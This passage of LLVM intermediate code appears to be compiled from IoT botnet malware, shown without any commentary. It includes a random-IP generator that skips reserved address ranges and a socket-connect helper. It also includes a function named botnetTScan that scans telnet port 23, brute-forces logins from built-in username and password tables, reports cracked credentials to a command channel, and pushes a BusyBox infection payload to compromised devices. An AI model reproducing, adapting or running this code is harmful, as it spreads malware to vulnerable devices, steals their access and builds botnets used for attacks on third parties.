  %or.cond1197 = or i1 %505, %or.cond595.old.old.old
  br i1 %or.cond1197, label %.critedge.backedge, label %521

; <label>:506:                                    ; preds = %thread-pre-split665
  %.off731 = add i8 %19, 74
  %507 = icmp ult i8 %.off731, 7
  %508 = icmp ugt i8 %19, -73
  %or.cond1192 = or i1 %507, %508
  %or.cond1193 = or i1 %or.cond1192, %394
  %or.cond595 = and i1 %206, %73
  %or.cond1194 = or i1 %or.cond1193, %or.cond595
  br i1 %or.cond1194, label %.critedge.backedge, label %521

; <label>:509:                                    ; preds = %thread-pre-split665
  %510 = icmp ult i8 %19, -11
  %notrhs1206 = icmp ne i8 %19, -1
  %or.cond585.not = xor i1 %510, %notrhs1206
  %or.cond595.old.old.old.old.old.old = and i1 %206, %73
  %or.cond1200 = or i1 %or.cond585.not, %or.cond595.old.old.old.old.old.old
  br i1 %or.cond1200, label %.critedge.backedge, label %521

; <label>:511:                                    ; preds = %thread-pre-split665
  %.off730 = add i8 %19, -97
  %512 = icmp ult i8 %.off730, 2
  %or.cond595.old.old.old.old.old.old.old = and i1 %206, %73
  %or.cond1201 = or i1 %512, %or.cond595.old.old.old.old.old.old.old
  br i1 %or.cond1201, label %.critedge.backedge, label %521

thread-pre-split671:                              ; preds = %thread-pre-split665
  %513 = icmp eq i8 %14, 86
  %514 = icmp eq i8 %387, -47
  %or.cond702 = and i1 %513, %514
  br i1 %or.cond702, label %.critedge.backedge, label %515

; <label>:515:                                    ; preds = %thread-pre-split671
  %516 = icmp eq i8 %14, -63
  %517 = icmp eq i8 %19, -92
  %or.cond592 = and i1 %516, %517
  br i1 %or.cond592, label %.critedge.backedge, label %518

; <label>:518:                                    ; preds = %515
  %519 = icmp eq i8 %14, 120
  %.off729 = add i8 %19, -103
  %520 = icmp ult i8 %.off729, 5
  %or.cond830 = and i1 %519, %520
  %or.cond595.old.old.old.old.old.old.old.old = and i1 %206, %73
  %or.cond1202 = or i1 %or.cond830, %or.cond595.old.old.old.old.old.old.old.old
  br i1 %or.cond1202, label %.critedge.backedge, label %521

; <label>:521:                                    ; preds = %518, %511, %509, %500, %502, %504, %491, %496, %506
  %522 = icmp eq i8 %14, 78
  %523 = icmp eq i8 %19, 46
  %or.cond597 = and i1 %522, %523
  %524 = icmp eq i8 %14, -32
  %or.cond599 = or i1 %524, %or.cond597
  br i1 %or.cond599, label %.critedge.backedge, label %525

; <label>:525:                                    ; preds = %521
  %526 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* nonnull %526, i8 0, i64 16, i32 16, i1 false)
  %527 = zext i8 %14 to i32
  %528 = zext i8 %19 to i32
  %529 = zext i8 %226 to i32
  %530 = and i32 %12, 255
  %531 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %526, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.99, i64 0, i64 0), i32 %527, i32 %528, i32 %529, i32 %530)
  %532 = call i32 @inet_addr(i8* nonnull %526) #6
  ret i32 %532
}

; Function Attrs: nounwind
declare i32 @rand() local_unnamed_addr #2

; Function Attrs: noinline nounwind uwtable
define i32 @GRIP(i32) local_unnamed_addr #1 {
  %2 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i64 0, i32 0), align 4
  %3 = tail call i32 @ntohl(i32 %2) #15
  %4 = and i32 %3, %0
  %5 = tail call i32 @rand_cmwc()
  %6 = xor i32 %0, -1
  %7 = and i32 %5, %6
  %8 = xor i32 %7, %4
  ret i32 %8
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) local_unnamed_addr #9

; Function Attrs: noinline nounwind uwtable
define i32 @socket_connect(i8*, i16 zeroext) local_unnamed_addr #1 {
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca i32, align 4
  store i32 1, i32* %4, align 4
  %5 = tail call %struct.hostent* @gethostbyname(i8* %0) #6
  %6 = icmp eq %struct.hostent* %5, null
  br i1 %6, label %27, label %7

; <label>:7:                                      ; preds = %2
  %8 = getelementptr inbounds %struct.hostent, %struct.hostent* %5, i64 0, i32 4
  %9 = load i8**, i8*** %8, align 8
  %10 = load i8*, i8** %9, align 8
  %11 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 2
  %12 = bitcast %struct.in_addr* %11 to i8*
  %13 = getelementptr inbounds %struct.hostent, %struct.hostent* %5, i64 0, i32 3
  %14 = load i32, i32* %13, align 4
  %15 = sext i32 %14 to i64
  call void @bcopy(i8* %10, i8* %12, i64 %15) #6
  %16 = tail call zeroext i16 @htons(i16 zeroext %1) #15
  %17 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 1
  store i16 %16, i16* %17, align 2
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 0
  store i16 2, i16* %18, align 4
  %19 = tail call i32 @socket(i32 2, i32 1, i32 6) #6
  %20 = bitcast i32* %4 to i8*
  %21 = call i32 @setsockopt(i32 %19, i32 6, i32 1, i8* nonnull %20, i32 4) #6
  %22 = icmp eq i32 %19, -1
  br i1 %22, label %27, label %23

; <label>:23:                                     ; preds = %7
  %24 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %25 = call i32 @connect(i32 %19, %struct.sockaddr* nonnull %24, i32 16) #6
  %26 = icmp eq i32 %25, -1
  %. = select i1 %26, i32 0, i32 %19
  br label %27

; <label>:27:                                     ; preds = %23, %7, %2
  %.0 = phi i32 [ 0, %2 ], [ 0, %7 ], [ %., %23 ]
  ret i32 %.0
}

declare %struct.hostent* @gethostbyname(i8*) local_unnamed_addr #5

; Function Attrs: nounwind
declare void @bcopy(i8* nocapture readonly, i8* nocapture, i64) local_unnamed_addr #2

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) local_unnamed_addr #2

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) local_unnamed_addr #2

; Function Attrs: noinline noreturn nounwind uwtable
define void @botnetTScan(i32, i32) local_unnamed_addr #11 {
  %3 = alloca %struct.fd_set, align 8
  %4 = alloca %struct.timeval, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = tail call i64 @time(i64* null) #6
  %9 = tail call i32 @rand_cmwc()
  %10 = zext i32 %9 to i64
  %11 = xor i64 %10, %8
  %12 = trunc i64 %11 to i32
  tail call void @srand(i32 %12) #6
  %13 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 0
  store i16 2, i16* %13, align 4
  %14 = tail call zeroext i16 @htons(i16 zeroext 23) #15
  %15 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 1
  store i16 %14, i16* %15, align 2
  %16 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 3, i64 0
  %17 = bitcast i8* %16 to i64*
  store i64 0, i64* %17, align 4
  %18 = tail call noalias i8* @malloc(i64 1025) #6
  tail call void @llvm.memset.p0i8.i64(i8* %18, i8 0, i64 1025, i32 1, i1 false)
  %19 = zext i32 %1 to i64
  %20 = alloca %struct.telstate_t, i64 %19, align 16
  %21 = bitcast %struct.telstate_t* %20 to i8*
  %22 = sext i32 %1 to i64
  %23 = mul nsw i64 %22, 5
  call void @llvm.memset.p0i8.i64(i8* nonnull %21, i8 0, i64 %23, i32 16, i1 false)
  %24 = icmp sgt i32 %1, 0
  br i1 %24, label %.lr.ph95.preheader, label %.preheader92.preheader

.lr.ph95.preheader:                               ; preds = %2
  %xtraiter = and i64 %19, 1
  %lcmp.mod = icmp eq i64 %xtraiter, 0
  br i1 %lcmp.mod, label %.lr.ph95.prol.loopexit, label %.lr.ph95.prol.preheader

.lr.ph95.prol.preheader:                          ; preds = %.lr.ph95.preheader
  br label %.lr.ph95.prol

.lr.ph95.prol:                                    ; preds = %.lr.ph95.prol.preheader
  %25 = bitcast %struct.telstate_t* %20 to i8*
  call void @llvm.memset.p0i8.i64(i8* %25, i8 0, i64 32, i32 16, i1 false)
  %26 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 0, i32 3
  store i8 1, i8* %26, align 1
  %27 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 0, i32 9
  store i8* %18, i8** %27, align 8
  br label %.lr.ph95.prol.loopexit

.lr.ph95.prol.loopexit:                           ; preds = %.lr.ph95.preheader, %.lr.ph95.prol
  %indvars.iv96.unr = phi i64 [ 0, %.lr.ph95.preheader ], [ 1, %.lr.ph95.prol ]
  %28 = icmp eq i32 %1, 1
  br i1 %28, label %.preheader92.preheader.loopexit, label %.lr.ph95.preheader.new

.lr.ph95.preheader.new:                           ; preds = %.lr.ph95.prol.loopexit
  br label %.lr.ph95

.lr.ph95:                                         ; preds = %.lr.ph95, %.lr.ph95.preheader.new
  %indvars.iv96 = phi i64 [ %indvars.iv96.unr, %.lr.ph95.preheader.new ], [ %indvars.iv.next97.1, %.lr.ph95 ]
  %29 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %indvars.iv96
  %30 = bitcast %struct.telstate_t* %29 to i8*
  call void @llvm.memset.p0i8.i64(i8* %30, i8 0, i64 32, i32 16, i1 false)
  %31 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %indvars.iv96, i32 3
  store i8 1, i8* %31, align 1
  %32 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %indvars.iv96, i32 9
  store i8* %18, i8** %32, align 8
  %indvars.iv.next97 = add nuw nsw i64 %indvars.iv96, 1
  %33 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %indvars.iv.next97
  %34 = bitcast %struct.telstate_t* %33 to i8*
  call void @llvm.memset.p0i8.i64(i8* %34, i8 0, i64 32, i32 16, i1 false)
  %35 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %indvars.iv.next97, i32 3
  store i8 1, i8* %35, align 1
  %36 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %indvars.iv.next97, i32 9
  store i8* %18, i8** %36, align 8
  %indvars.iv.next97.1 = add nsw i64 %indvars.iv96, 2
  %exitcond.1 = icmp eq i64 %indvars.iv.next97.1, %19
  br i1 %exitcond.1, label %.preheader92.preheader.loopexit.unr-lcssa, label %.lr.ph95

.preheader92.preheader.loopexit.unr-lcssa:        ; preds = %.lr.ph95
  br label %.preheader92.preheader.loopexit

.preheader92.preheader.loopexit:                  ; preds = %.lr.ph95.prol.loopexit, %.preheader92.preheader.loopexit.unr-lcssa
  br label %.preheader92.preheader

.preheader92.preheader:                           ; preds = %.preheader92.preheader.loopexit, %2
  br label %.preheader92

.preheader92:                                     ; preds = %.preheader92.preheader, %.preheader92
  %indvars.iv = phi i64 [ %indvars.iv.next, %.preheader92 ], [ 0, %.preheader92.preheader ]
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %37 = getelementptr inbounds [11 x i8*], [11 x i8*]* @tmpdirs, i64 0, i64 %indvars.iv.next
  %38 = load i8*, i8** %37, align 8
  %39 = icmp eq i8* %38, null
  br i1 %39, label %.preheader, label %.preheader92

.preheader:                                       ; preds = %.preheader92
  %40 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %41 = getelementptr inbounds %struct.timeval, %struct.timeval* %4, i64 0, i32 0
  %42 = getelementptr inbounds %struct.timeval, %struct.timeval* %4, i64 0, i32 1
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit, %.preheader
  br i1 %24, label %.lr.ph.preheader, label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit
  %43 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 2, i32 0
  %44 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %3, i64 0, i32 0, i64 0
  %45 = sext i32 %0 to i64
  %46 = bitcast i32* %6 to i8*
  br label %.lr.ph

.lr.ph:                                           ; preds = %274, %.lr.ph.preheader
  %.193 = phi i32 [ %.mux, %274 ], [ 0, %.lr.ph.preheader ]
  %47 = sext i32 %.193 to i64
  %48 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %47
  %49 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %47, i32 7
  %50 = load i32, i32* %49, align 16
  %51 = icmp eq i32 %50, 0
  br i1 %51, label %52, label %55

; <label>:52:                                     ; preds = %.lr.ph
  %53 = call i64 @time(i64* null) #6
  %54 = trunc i64 %53 to i32
  store i32 %54, i32* %49, align 16
  br label %55

; <label>:55:                                     ; preds = %52, %.lr.ph
  %56 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %47, i32 2
  %57 = load i8, i8* %56, align 8
  switch i8 %57, label %274 [
    i8 0, label %58
    i8 1, label %99
    i8 2, label %132
    i8 3, label %152
    i8 4, label %170
    i8 5, label %190
    i8 6, label %208
    i8 7, label %253
  ]

; <label>:58:                                     ; preds = %55
  %59 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %47, i32 3
  %60 = load i8, i8* %59, align 1
  switch i8 %60, label %80 [
    i8 1, label %61
    i8 0, label %68
  ]

; <label>:61:                                     ; preds = %58
  %62 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %47, i32 9
  %63 = bitcast i8** %62 to i64*
  %64 = load i64, i64* %63, align 8
  %65 = bitcast %struct.telstate_t* %48 to i8*
  call void @llvm.memset.p0i8.i64(i8* %65, i8 0, i64 32, i32 16, i1 false)
  store i64 %64, i64* %63, align 8
  %66 = call i32 @GIP()
  %67 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %47, i32 1
  store i32 %66, i32* %67, align 4
  br label %80

; <label>:68:                                     ; preds = %58
  %69 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %47, i32 5
  %70 = load i8, i8* %69, align 1
  %71 = add i8 %70, 1
  store i8 %71, i8* %69, align 1
  %72 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %47, i32 4
  %73 = load i8, i8* %72, align 2
  %74 = add i8 %73, 1
  store i8 %74, i8* %72, align 2
  %75 = icmp eq i8 %71, 36
  br i1 %75, label %76, label %77

; <label>:76:                                     ; preds = %68
  store i8 1, i8* %59, align 1
  br label %274

; <label>:77:                                     ; preds = %68
  %78 = icmp eq i8 %74, 36
  br i1 %78, label %79, label %80

; <label>:79:                                     ; preds = %77
  store i8 1, i8* %59, align 1
  br label %274

; <label>:80:                                     ; preds = %58, %77, %61
  store i16 2, i16* %13, align 4
  store i16 %14, i16* %15, align 2
  store i64 0, i64* %17, align 4
  %81 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %47, i32 1
  %82 = load i32, i32* %81, align 4
  store i32 %82, i32* %43, align 4
  %83 = call i32 @socket(i32 2, i32 1, i32 0) #6
  %84 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 0, i32 0
  store i32 %83, i32* %84, align 16
  %85 = icmp eq i32 %83, -1
  br i1 %85, label %274, label %86

; <label>:86:                                     ; preds = %80
  %87 = call i32 (i32, i32, ...) @fcntl(i32 %83, i32 3, i8* null) #6
  %88 = or i32 %87, 2048
  %89 = call i32 (i32, i32, ...) @fcntl(i32 %83, i32 4, i32 %88) #6
  %90 = load i32, i32* %84, align 16
  %91 = call i32 @connect(i32 %90, %struct.sockaddr* nonnull %40, i32 16) #6
  %92 = icmp eq i32 %91, -1
  br i1 %92, label %93, label %98

; <label>:93:                                     ; preds = %86
  %94 = tail call i32* @__errno_location() #15
  %95 = load i32, i32* %94, align 4
  %96 = icmp eq i32 %95, 115
  br i1 %96, label %98, label %97

; <label>:97:                                     ; preds = %93
  call void @reset_telstate(%struct.telstate_t* nonnull %48)
  br label %274

; <label>:98:                                     ; preds = %93, %86
  call void @advance_state(%struct.telstate_t* nonnull %48, i32 1)
  br label %274

; <label>:99:                                     ; preds = %55
  %100 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %44) #6, !srcloc !26
  %101 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 0, i32 0
  %102 = load i32, i32* %101, align 16
  %103 = srem i32 %102, 64
  %104 = zext i32 %103 to i64
  %105 = shl i64 1, %104
  %106 = sdiv i32 %102, 64
  %107 = sext i32 %106 to i64
  %108 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %3, i64 0, i32 0, i64 %107
  %109 = load i64, i64* %108, align 8
  %110 = or i64 %105, %109
  store i64 %110, i64* %108, align 8
  store i64 0, i64* %41, align 8
  store i64 %45, i64* %42, align 8
  %111 = add nsw i32 %102, 1
  %112 = call i32 @select(i32 %111, %struct.fd_set* null, %struct.fd_set* nonnull %3, %struct.fd_set* null, %struct.timeval* nonnull %4) #6
  switch i32 %112, label %125 [
    i32 1, label %113
    i32 -1, label %124
  ]

; <label>:113:                                    ; preds = %99
  store i32 4, i32* %5, align 4
  store i32 0, i32* %6, align 4
  %114 = load i32, i32* %101, align 16
  %115 = call i32 @getsockopt(i32 %114, i32 1, i32 4, i8* nonnull %46, i32* nonnull %5) #6
  %116 = load i32, i32* %6, align 4
  %117 = icmp eq i32 %116, 0
  br i1 %117, label %119, label %118

; <label>:118:                                    ; preds = %113
  call void @reset_telstate(%struct.telstate_t* nonnull %48)
  br label %274

; <label>:119:                                    ; preds = %113
  %120 = load i32, i32* %101, align 16
  %121 = call i32 (i32, i32, ...) @fcntl(i32 %120, i32 3, i8* null) #6
  %122 = and i32 %121, -2049
  %123 = call i32 (i32, i32, ...) @fcntl(i32 %120, i32 4, i32 %122) #6
  call void @advance_state(%struct.telstate_t* nonnull %48, i32 2)
  br label %274

; <label>:124:                                    ; preds = %99
  call void @reset_telstate(%struct.telstate_t* nonnull %48)
  br label %274

; <label>:125:                                    ; preds = %99
  %126 = load i32, i32* %49, align 16
  %127 = add i32 %126, 5
  %128 = zext i32 %127 to i64
  %129 = call i64 @time(i64* null) #6
  %130 = icmp slt i64 %128, %129
  br i1 %130, label %131, label %274

; <label>:131:                                    ; preds = %125
  call void @reset_telstate(%struct.telstate_t* nonnull %48)
  br label %274

; <label>:132:                                    ; preds = %55
  %133 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 0, i32 0
  %134 = load i32, i32* %133, align 16
  %135 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %47, i32 9
  %136 = load i8*, i8** %135, align 8
  %137 = call i32 @read_until_response(i32 %134, i32 %0, i8* %136, i32 1024, i8** getelementptr inbounds ([5 x i8*], [5 x i8*]* @advances, i64 0, i64 0))
  %138 = icmp eq i32 %137, 0
  br i1 %138, label %145, label %139

; <label>:139:                                    ; preds = %132
  %140 = load i8*, i8** %135, align 8
  %141 = call i32 @contains_fail(i8* %140)
  %142 = icmp eq i32 %141, 0
  br i1 %142, label %144, label %143

; <label>:143:                                    ; preds = %139
  call void @advance_state(%struct.telstate_t* nonnull %48, i32 0)
  br label %274

; <label>:144:                                    ; preds = %139
  call void @advance_state(%struct.telstate_t* nonnull %48, i32 3)
  br label %274

; <label>:145:                                    ; preds = %132
  %146 = load i32, i32* %49, align 16
  %147 = add i32 %146, 7
  %148 = zext i32 %147 to i64
  %149 = call i64 @time(i64* null) #6
  %150 = icmp slt i64 %148, %149
  br i1 %150, label %151, label %274

; <label>:151:                                    ; preds = %145
  call void @reset_telstate(%struct.telstate_t* nonnull %48)
  br label %274

; <label>:152:                                    ; preds = %55
  %153 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 0, i32 0
  %154 = load i32, i32* %153, align 16
  %155 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %47, i32 4
  %156 = load i8, i8* %155, align 2
  %157 = zext i8 %156 to i64
  %158 = getelementptr inbounds [36 x i8*], [36 x i8*]* @usernames, i64 0, i64 %157
  %159 = load i8*, i8** %158, align 8
  %160 = call i64 @strlen(i8* %159) #14
  %161 = call i64 @send(i32 %154, i8* %159, i64 %160, i32 16384) #6
  %162 = icmp slt i64 %161, 0
  br i1 %162, label %163, label %164

; <label>:163:                                    ; preds = %152
  call void @reset_telstate(%struct.telstate_t* nonnull %48)
  br label %274

; <label>:164:                                    ; preds = %152
  %165 = load i32, i32* %153, align 16
  %166 = call i64 @send(i32 %165, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.100, i64 0, i64 0), i64 2, i32 16384) #6
  %167 = icmp slt i64 %166, 0
  br i1 %167, label %168, label %169

; <label>:168:                                    ; preds = %164
  call void @reset_telstate(%struct.telstate_t* nonnull %48)
  br label %274

; <label>:169:                                    ; preds = %164
  call void @advance_state(%struct.telstate_t* nonnull %48, i32 4)
  br label %274

; <label>:170:                                    ; preds = %55
  %171 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 0, i32 0
  %172 = load i32, i32* %171, align 16
  %173 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %47, i32 9
  %174 = load i8*, i8** %173, align 8
  %175 = call i32 @read_until_response(i32 %172, i32 %0, i8* %174, i32 1024, i8** getelementptr inbounds ([5 x i8*], [5 x i8*]* @advances, i64 0, i64 0))
  %176 = icmp eq i32 %175, 0
  br i1 %176, label %183, label %177

; <label>:177:                                    ; preds = %170
  %178 = load i8*, i8** %173, align 8
  %179 = call i32 @contains_fail(i8* %178)
  %180 = icmp eq i32 %179, 0
  br i1 %180, label %182, label %181

; <label>:181:                                    ; preds = %177
  call void @advance_state(%struct.telstate_t* nonnull %48, i32 0)
  br label %274

; <label>:182:                                    ; preds = %177
  call void @advance_state(%struct.telstate_t* nonnull %48, i32 5)
  br label %274

; <label>:183:                                    ; preds = %170
  %184 = load i32, i32* %49, align 16
  %185 = add i32 %184, 3
  %186 = zext i32 %185 to i64
  %187 = call i64 @time(i64* null) #6
  %188 = icmp slt i64 %186, %187
  br i1 %188, label %189, label %274

; <label>:189:                                    ; preds = %183
  call void @reset_telstate(%struct.telstate_t* nonnull %48)
  br label %274

; <label>:190:                                    ; preds = %55
  %191 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 0, i32 0
  %192 = load i32, i32* %191, align 16
  %193 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %47, i32 5
  %194 = load i8, i8* %193, align 1
  %195 = zext i8 %194 to i64
  %196 = getelementptr inbounds [36 x i8*], [36 x i8*]* @passwords, i64 0, i64 %195
  %197 = load i8*, i8** %196, align 8
  %198 = call i64 @strlen(i8* %197) #14
  %199 = call i64 @send(i32 %192, i8* %197, i64 %198, i32 16384) #6
  %200 = icmp slt i64 %199, 0
  br i1 %200, label %201, label %202

; <label>:201:                                    ; preds = %190
  call void @reset_telstate(%struct.telstate_t* nonnull %48)
  br label %274

; <label>:202:                                    ; preds = %190
  %203 = load i32, i32* %191, align 16
  %204 = call i64 @send(i32 %203, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.100, i64 0, i64 0), i64 2, i32 16384) #6
  %205 = icmp slt i64 %204, 0
  br i1 %205, label %206, label %207

; <label>:206:                                    ; preds = %202
  call void @reset_telstate(%struct.telstate_t* nonnull %48)
  br label %274

; <label>:207:                                    ; preds = %202
  call void @advance_state(%struct.telstate_t* nonnull %48, i32 6)
  br label %274

; <label>:208:                                    ; preds = %55
  %209 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 0, i32 0
  %210 = load i32, i32* %209, align 16
  %211 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %47, i32 9
  %212 = load i8*, i8** %211, align 8
  %213 = call i32 @read_until_response(i32 %210, i32 %0, i8* %212, i32 1024, i8** getelementptr inbounds ([11 x i8*], [11 x i8*]* @advances2, i64 0, i64 0))
  %214 = icmp eq i32 %213, 0
  br i1 %214, label %246, label %215

; <label>:215:                                    ; preds = %208
  %216 = call i64 @time(i64* null) #6
  %217 = trunc i64 %216 to i32
  store i32 %217, i32* %49, align 16
  %218 = load i8*, i8** %211, align 8
  %219 = call i32 @contains_fail(i8* %218)
  %220 = icmp eq i32 %219, 0
  br i1 %220, label %222, label %221

; <label>:221:                                    ; preds = %215
  call void @advance_state(%struct.telstate_t* nonnull %48, i32 0)
  br label %274

; <label>:222:                                    ; preds = %215
  %223 = load i8*, i8** %211, align 8
  %224 = call i32 @contains_success(i8* %223)
  %225 = icmp eq i32 %224, 0
  br i1 %225, label %245, label %226

; <label>:226:                                    ; preds = %222
  %227 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %47, i32 3
  %228 = load i8, i8* %227, align 1
  %229 = icmp eq i8 %228, 2
  br i1 %229, label %230, label %231

; <label>:230:                                    ; preds = %226
  call void @advance_state(%struct.telstate_t* nonnull %48, i32 7)
  br label %274

; <label>:231:                                    ; preds = %226
  %232 = load i32, i32* @KadenCommStock, align 4
  %233 = call i8* @get_telstate_host(%struct.telstate_t* nonnull %48)
  %234 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %47, i32 4
  %235 = load i8, i8* %234, align 2
  %236 = zext i8 %235 to i64
  %237 = getelementptr inbounds [36 x i8*], [36 x i8*]* @usernames, i64 0, i64 %236
  %238 = load i8*, i8** %237, align 8
  %239 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %47, i32 5
  %240 = load i8, i8* %239, align 1
  %241 = zext i8 %240 to i64
  %242 = getelementptr inbounds [36 x i8*], [36 x i8*]* @passwords, i64 0, i64 %241
  %243 = load i8*, i8** %242, align 8
  %244 = call i32 (i32, i8*, ...) @botnetPrint(i32 %232, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.101, i64 0, i64 0), i8* %233, i8* %238, i8* %243)
  call void @advance_state(%struct.telstate_t* nonnull %48, i32 7)
  br label %274

; <label>:245:                                    ; preds = %222
  call void @reset_telstate(%struct.telstate_t* nonnull %48)
  br label %274

; <label>:246:                                    ; preds = %208
  %247 = load i32, i32* %49, align 16
  %248 = add i32 %247, 7
  %249 = zext i32 %248 to i64
  %250 = call i64 @time(i64* null) #6
  %251 = icmp slt i64 %249, %250
  br i1 %251, label %252, label %274

; <label>:252:                                    ; preds = %246
  call void @reset_telstate(%struct.telstate_t* nonnull %48)
  br label %274

; <label>:253:                                    ; preds = %55
  %254 = call i64 @time(i64* null) #6
  %255 = trunc i64 %254 to i32
  store i32 %255, i32* %49, align 16
  %256 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 0, i32 0
  %257 = load i32, i32* %256, align 16
  %258 = call i64 @send(i32 %257, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.102, i64 0, i64 0), i64 4, i32 16384) #6
  %259 = load i32, i32* %256, align 16
  %260 = call i64 @send(i32 %259, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.103, i64 0, i64 0), i64 7, i32 16384) #6
  %261 = load i32, i32* %256, align 16
  %262 = load i8*, i8** @BusyBoxPayload, align 8
  %263 = call i64 @strlen(i8* %262) #14
  %264 = call i64 @send(i32 %261, i8* %262, i64 %263, i32 16384) #6
  %265 = icmp slt i64 %264, 0
  br i1 %265, label %266, label %267

; <label>:266:                                    ; preds = %253
  call void @reset_telstate(%struct.telstate_t* nonnull %48)
  br label %274

; <label>:267:                                    ; preds = %253
  %268 = load i32, i32* %49, align 16
  %269 = add i32 %268, 25
  %270 = zext i32 %269 to i64
  %271 = call i64 @time(i64* null) #6
  %272 = icmp slt i64 %270, %271
  br i1 %272, label %273, label %274

; <label>:273:                                    ; preds = %267
  call void @reset_telstate(%struct.telstate_t* nonnull %48)
  br label %274

; <label>:274:                                    ; preds = %55, %169, %207, %98, %97, %131, %125, %151, %145, %189, %183, %252, %246, %273, %267, %221, %230, %231, %245, %181, %182, %143, %144, %118, %119, %80, %266, %206, %201, %168, %163, %124, %79, %76
  %275 = add nsw i32 %.193, 1
  %276 = icmp slt i32 %275, %1
  %.mux = select i1 %276, i32 %275, i32 0
  br label %.lr.ph
}

; Function Attrs: nounwind
declare void @srand(i32) local_unnamed_addr #2

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #6

; Function Attrs: noinline norecurse nounwind uwtable
define void @makeRandomStr(i8* nocapture, i32) local_unnamed_addr #3 {
  %3 = icmp sgt i32 %1, 0
  br i1 %3, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %2
  %wide.trip.count = zext i32 %1 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %indvars.iv = phi i64 [ %indvars.iv.next, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %4 = tail call i32 @rand_cmwc()
  %5 = urem i32 %4, 26
  %6 = add nuw nsw i32 %5, 65
  %7 = trunc i32 %6 to i8
  %8 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv
  store i8 %7, i8* %8, align 1
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %exitcond = icmp eq i64 %indvars.iv.next, %wide.trip.count
  br i1 %exitcond, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %2
  ret void
}

; Function Attrs: noinline norecurse nounwind readonly uwtable
define zeroext i16 @csum(i16* nocapture readonly, i32) local_unnamed_addr #4 {
  %3 = icmp sgt i32 %1, 1
  br i1 %3, label %.lr.ph16.preheader, label %._crit_edge17

